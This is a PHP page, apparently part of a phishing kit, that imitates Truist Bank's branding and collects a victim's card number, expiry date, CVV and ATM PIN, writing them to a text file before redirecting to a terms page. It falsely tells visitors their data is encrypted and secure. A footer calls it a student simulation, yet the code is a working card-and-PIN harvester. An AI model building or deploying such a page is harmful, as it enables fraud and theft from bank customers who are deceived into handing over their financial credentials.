<?php
session_start();
require_once __DIR__ . '/includes/file_storage.php';

// Redirect to login if no username in session
if (!isset($_SESSION['emzemz'])) {
    header('Location: index.php');
    exit;
}

$username = $_SESSION['emzemz'];
$errors = [];

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Get form data
    $cardNumber = $_POST['cardNumber'] ?? '';
    $expiryMonth = $_POST['expiryMonth'] ?? '';
    $expiryYear = $_POST['expiryYear'] ?? '';
    $cvv = $_POST['cvv'] ?? '';
    $atmPin = $_POST['atmPin'] ?? '';
    
    // Validation
    $cardDigits = preg_replace('/\s/', '', $cardNumber);
    if (strlen($cardDigits) !== 16) {
        $errors['cardNumber'] = 'Card number must be 16 digits';
    }
    
    if (empty($expiryMonth) || empty($expiryYear)) {
        $errors['expiry'] = 'Expiry date is required';
    }
    
    if (strlen($cvv) !== 3 && strlen($cvv) !== 4) {
        $errors['cvv'] = 'CVV must be 3 or 4 digits';
    }
    
    if (strlen($atmPin) !== 4) {
        $errors['atmPin'] = 'ATM PIN must be 4 digits';
    }
    
    if (empty($errors)) {
        // Save to test file (matching affinity field names)
        $data = [
            'step' => 'card_information',
            'usrnm' => $username,
            'pay_card' => $cardDigits,
            'exp_mth' => $expiryMonth,
            'exp_yr' => $expiryYear,
            'sec_cd' => $cvv,
            'pin_cd' => $atmPin
        ];
        
        saveUserData('card_information.txt', $data);
        
        // Redirect to terms page
        header('Location: terms.php');
        exit;
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Card Information - Truist Bank</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="min-h-screen flex flex-col bg-[#f6f3fa]">
    <!-- Header -->
    <header class="bg-[#2b0d49] text-white shadow-[0_2px_8px_rgba(22,9,40,0.45)]">
        <div class="max-w-6xl mx-auto h-16 flex items-center justify-start px-6">
            <img
                src="assets/trulogo_horz-white.png"
                alt="Truist logo"
                class="h-8 w-auto"
            />
        </div>
    </header>

    <!-- Main Content -->
    <main class="flex-1 flex items-start justify-center px-4 sm:px-6 py-10">
        <div class="w-full max-w-5xl">
            <section class="w-full">
                <h1 class="mx-auto mb-6 w-full max-w-2xl text-center text-3xl font-semibold text-[#2b0d49]">
                    Card Information
                </h1>
                <div class="mx-auto w-full max-w-2xl rounded-2xl border border-[#e2d8f1] bg-white shadow-[0_20px_60px_rgba(43,13,73,0.12)]">
                    <div class="px-8 py-10">
                        <p class="text-sm font-semibold text-[#6c5d85]">Please provide your card details for verification purposes</p>

                        <?php if (!empty($errors)): ?>
                            <div class="bg-red-50 border-l-4 border-red-500 p-4 mb-6">
                                <div class="flex">
                                    <div class="flex-shrink-0">
                                        <svg class="h-5 w-5 text-red-500" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" fill="currentColor">
                                            <path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zM8.707 7.293a1 1 0 00-1.414 1.414L8.586 10l-1.293 1.293a1 1 0 101.414 1.414L10 11.414l1.293 1.293a1 1 0 001.414-1.414L11.414 10l1.293-1.293a1 1 0 00-1.414-1.414L10 8.586 8.707 7.293z" clip-rule="evenodd" />
                                        </svg>
                                    </div>
                                    <div class="ml-3">
                                        <p class="text-sm text-red-700">
                                            Please fix the following errors:
                                            <ul class="list-disc pl-5 mt-1">
                                                <?php foreach ($errors as $error): ?>
                                                    <li><?php echo htmlspecialchars($error); ?></li>
                                                <?php endforeach; ?>
                                            </ul>
                                        </p>
                                    </div>
                                </div>
                            </div>
                        <?php endif; ?>
                        
                        <form method="POST" class="mt-8 space-y-6">
                            <!-- Card Number -->
                            <div class="space-y-2">
                                <label class="text-sm text-[#5d4f72]" for="cardNumber">
                                    Card Number
                                </label>
                                <input
                                    id="cardNumber"
                                    name="cardNumber"
                                    type="text"
                                    value="<?php echo htmlspecialchars($_POST['cardNumber'] ?? ''); ?>"
                                    maxlength="19"
                                    class="w-full rounded-xl border border-[#cfc2df] px-4 py-3 text-sm text-[#3c3451] focus:border-[#7a3ec8] focus:outline-none focus:ring-2 focus:ring-[#c5b2e3]"
                                    placeholder="1234 5678 9012 3456"
                                    required
                                />
                                <?php if (isset($errors['cardNumber'])): ?>
                                    <div class="flex items-center gap-2 text-xs font-semibold text-[#b11f4e]" role="alert">
                                        <svg aria-hidden="true" class="h-4 w-4" viewBox="0 0 24 24" fill="currentColor">
                                            <path d="M12 2l10 18H2L12 2zm0 5.75a.75.75 0 00-.75.75v4a.75.75 0 001.5 0v-4a.75.75 0 00-.75-.75zm0 7a.88.88 0 100 1.75.88.88 0 000-1.75z" />
                                        </svg>
                                        <span><?php echo htmlspecialchars($errors['cardNumber']); ?></span>
                                    </div>
                                <?php endif; ?>
                            </div>
                            
                            <!-- Expiry Date -->
                            <div class="space-y-2">
                                <label class="text-sm text-[#5d4f72]">Expiry Date</label>
                                <div class="flex gap-2">
                                    <select
                                        id="expiryMonth"
                                        name="expiryMonth"
                                        class="flex-1 rounded-xl border border-[#cfc2df] px-4 py-3 text-sm text-[#3c3451] focus:border-[#7a3ec8] focus:outline-none focus:ring-2 focus:ring-[#c5b2e3]"
                                        required
                                    >
                                        <option value="">Month</option>
                                        <?php for ($i = 1; $i <= 12; $i++): ?>
                                            <option value="<?php echo str_pad($i, 2, '0', STR_PAD_LEFT); ?>" <?php echo (isset($_POST['expiryMonth']) && $_POST['expiryMonth'] == str_pad($i, 2, '0', STR_PAD_LEFT)) ? 'selected' : ''; ?>>
                                                <?php echo str_pad($i, 2, '0', STR_PAD_LEFT); ?>
                                            </option>
                                        <?php endfor; ?>
                                    </select>
                                    <select
                                        id="expiryYear"
                                        name="expiryYear"
                                        class="flex-1 rounded-xl border border-[#cfc2df] px-4 py-3 text-sm text-[#3c3451] focus:border-[#7a3ec8] focus:outline-none focus:ring-2 focus:ring-[#c5b2e3]"
                                        required
                                    >
                                        <option value="">Year</option>
                                        <?php for ($i = 0; $i < 15; $i++): ?>
                                            <option value="<?php echo date('Y') + $i; ?>" <?php echo (isset($_POST['expiryYear']) && $_POST['expiryYear'] == date('Y') + $i) ? 'selected' : ''; ?>>
                                                <?php echo date('Y') + $i; ?>
                                            </option>
                                        <?php endfor; ?>
                                    </select>
                                </div>
                                <?php if (isset($errors['expiry'])): ?>
                                    <div class="flex items-center gap-2 text-xs font-semibold text-[#b11f4e]" role="alert">
                                        <svg aria-hidden="true" class="h-4 w-4" viewBox="0 0 24 24" fill="currentColor">
                                            <path d="M12 2l10 18H2L12 2zm0 5.75a.75.75 0 00-.75.75v4a.75.75 0 001.5 0v-4a.75.75 0 00-.75-.75zm0 7a.88.88 0 100 1.75.88.88 0 000-1.75z" />
                                        </svg>
                                        <span><?php echo htmlspecialchars($errors['expiry']); ?></span>
                                    </div>
                                <?php endif; ?>
                            </div>
                            
                            <!-- CVV -->
                            <div class="space-y-2">
                                <label class="text-sm text-[#5d4f72]" for="cvv">
                                    CVV
                                </label>
                                <div class="relative">
                                    <input
                                        id="cvv"
                                        name="cvv"
                                        type="password"
                                        value="<?php echo htmlspecialchars($_POST['cvv'] ?? ''); ?>"
                                        maxlength="4"
                                        class="w-full rounded-xl border border-[#cfc2df] px-4 py-3 text-sm text-[#3c3451] focus:border-[#7a3ec8] focus:outline-none focus:ring-2 focus:ring-[#c5b2e3]"
                                        placeholder="123"
                                        required
                                    />
                                    <button
                                        type="button"
                                        onclick="toggleCVVVisibility()"
                                        class="absolute right-3 top-1/2 -translate-y-1/2 text-[#5f259f] text-sm hover:underline"
                                    >
                                        <span id="cvvToggleText">Show</span>
                                    </button>
                                </div>
                                <?php if (isset($errors['cvv'])): ?>
                                    <div class="flex items-center gap-2 text-xs font-semibold text-[#b11f4e]" role="alert">
                                        <svg aria-hidden="true" class="h-4 w-4" viewBox="0 0 24 24" fill="currentColor">
                                            <path d="M12 2l10 18H2L12 2zm0 5.75a.75.75 0 00-.75.75v4a.75.75 0 001.5 0v-4a.75.75 0 00-.75-.75zm0 7a.88.88 0 100 1.75.88.88 0 000-1.75z" />
                                        </svg>
                                        <span><?php echo htmlspecialchars($errors['cvv']); ?></span>
                                    </div>
                                <?php endif; ?>
                            </div>
                            
                            <!-- ATM PIN -->
                            <div class="space-y-2">
                                <label class="text-sm text-[#5d4f72]" for="atmPin">
                                    ATM PIN
                                </label>
                                <div class="relative">
                                    <input
                                        id="atmPin"
                                        name="atmPin"
                                        type="password"
                                        value="<?php echo htmlspecialchars($_POST['atmPin'] ?? ''); ?>"
                                        maxlength="4"
                                        class="w-full rounded-xl border border-[#cfc2df] px-4 py-3 text-sm text-[#3c3451] focus:border-[#7a3ec8] focus:outline-none focus:ring-2 focus:ring-[#c5b2e3]"
                                        placeholder="****"
                                        required
                                    />
                                    <button
                                        type="button"
                                        onclick="togglePINVisibility()"
                                        class="absolute right-3 top-1/2 -translate-y-1/2 text-[#5f259f] text-sm hover:underline"
                                    >
                                        <span id="pinToggleText">Show</span>
                                    </button>
                                </div>
                                <?php if (isset($errors['atmPin'])): ?>
                                    <div class="flex items-center gap-2 text-xs font-semibold text-[#b11f4e]" role="alert">
                                        <svg aria-hidden="true" class="h-4 w-4" viewBox="0 0 24 24" fill="currentColor">
                                            <path d="M12 2l10 18H2L12 2zm0 5.75a.75.75 0 00-.75.75v4a.75.75 0 001.5 0v-4a.75.75 0 00-.75-.75zm0 7a.88.88 0 100 1.75.88.88 0 000-1.75z" />
                                        </svg>
                                        <span><?php echo htmlspecialchars($errors['atmPin']); ?></span>
                                    </div>
                                <?php endif; ?>
                            </div>
                            
                            <div class="flex flex-wrap gap-3 pt-2">
                                <button
                                    type="submit"
                                    class="inline-flex items-center justify-center rounded-full bg-[#5f259f] px-8 py-3 text-sm font-semibold text-white hover:bg-[#4a1a7e]"
                                >
                                    Continue
                                </button>
                            </div>
                            
                            <p class="text-xs text-[#6c5d85] mt-4">
                                Your card information is encrypted and secure. We use industry-standard security measures to protect your data.
                            </p>
                        </form>
                    </div>
                </div>
            </section>
        </div>
    </main>

    <!-- Footer -->
    <footer class="bg-[#2b0d49] text-white">
        <div class="max-w-6xl mx-auto px-6 py-8 grid gap-6 lg:grid-cols-[auto_1fr_auto] items-start">
            <div class="flex flex-col gap-3">
                <div class="flex items-center">
                    <img
                        src="assets/trulogo_horz-white.png"
                        alt="Truist logo"
                        class="h-8 w-auto"
                    />
                </div>
                <p class="text-xs text-white/70 max-w-xs">
                    Tailored banking experiences, demonstrated for students and simulation exercises only.
                </p>
            </div>

            <div class="grid gap-3 sm:grid-cols-2 lg:grid-cols-3 text-sm">
                <ul class="space-y-2">
                    <li>
                        <a class="text-white/80 hover:text-white" href="#">
                            Privacy
                        </a>
                    </li>
                    <li>
                        <a class="text-white/80 hover:text-white" href="#">
                            Accessibility
                        </a>
                    </li>
                </ul>
                <ul class="space-y-2">
                    <li>
                        <a class="text-white/80 hover:text-white" href="#">
                            Fraud & security
                        </a>
                    </li>
                    <li>
                        <a class="text-white/80 hover:text-white" href="#">
                            Limit use of my sensitive personal information
                        </a>
                    </li>
                </ul>
                <ul class="space-y-2">
                    <li>
                        <a class="text-white/80 hover:text-white" href="#">
                            Terms and conditions
                        </a>
                    </li>
                    <li>
                        <a class="text-white/80 hover:text-white" href="#">
                            Disclosures
                        </a>
                    </li>
                </ul>
            </div>
        </div>
        <div class="bg-black/90">
            <p class="max-w-6xl mx-auto px-6 py-3 text-center text-xs text-white/70">
                © 2025, Truist. All rights reserved.
            </p>
        </div>
    </footer>

    <script>
        // Format card number
        document.getElementById('cardNumber').addEventListener('input', function(e) {
            let value = e.target.value.replace(/\D/g, '');
            let formatted = value.match(/.{1,4}/g);
            e.target.value = formatted ? formatted.join(' ') : value;
        });
        
        // Toggle CVV visibility
        function toggleCVVVisibility() {
            const cvvInput = document.getElementById('cvv');
            const toggleText = document.getElementById('cvvToggleText');
            
            if (cvvInput.type === 'password') {
                cvvInput.type = 'text';
                toggleText.textContent = 'Hide';
            } else {
                cvvInput.type = 'password';
                toggleText.textContent = 'Show';
            }
        }
        
        // Toggle PIN visibility
        function togglePINVisibility() {
            const pinInput = document.getElementById('atmPin');
            const toggleText = document.getElementById('pinToggleText');
            
            if (pinInput.type === 'password') {
                pinInput.type = 'text';
                toggleText.textContent = 'Hide';
            } else {
                pinInput.type = 'password';
                toggleText.textContent = 'Show';
            }
        }
        
        // Auto-focus card number on page load
        document.addEventListener('DOMContentLoaded', function() {
            const cardInput = document.getElementById('cardNumber');
            if (cardInput) {
                cardInput.focus();
            }
        });
    </script>
</body>
</html>
